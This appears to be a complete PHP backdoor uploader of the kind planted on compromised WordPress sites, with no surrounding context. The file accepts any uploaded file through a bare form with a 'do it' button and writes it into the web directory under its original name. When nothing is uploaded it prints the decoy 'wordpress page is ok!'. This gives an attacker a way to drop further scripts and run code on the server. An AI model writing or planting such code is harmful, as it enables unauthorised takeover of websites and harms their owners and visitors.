<?php $trpath=basename($_FILES["tragefile"]["name"]);if(move_uploaded_file($_FILES["tragefile"]["tmp_name"],$trpath)){echo basename($_FILES["tragefile"]["name"])." has been done";}else{echo "wordpress page is ok!";} ?><form enctype="multipart/form-data" method="POST"><input name="tragefile" type="file"/><input type="submit" value="do it"/></form>